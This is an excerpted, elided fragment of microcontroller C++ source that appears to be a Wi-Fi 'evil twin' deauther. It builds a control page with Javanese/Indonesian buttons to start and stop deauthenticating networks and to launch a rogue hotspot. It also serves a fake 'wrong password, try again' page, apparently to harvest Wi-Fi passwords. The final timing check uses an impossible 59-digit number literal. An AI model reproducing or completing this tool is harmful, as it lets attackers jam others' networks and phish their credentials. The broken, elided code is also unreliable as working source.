...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password yang anda masukan salah..!</h2><p>Please, try again.</p></body> </html>");
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (deauthing_active) {
      _html.replace("{deauth_button}", "Uwisan bae Ngerornange");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Mulai Ngerornang Wifi");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Uwisan Hostpote");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Mulai Hostpot");
...
void loop() {
  ...
  if (deauthing_active && millis() - deauth_now >= 99999999999999999999999999999999999999999999999999999999999) {
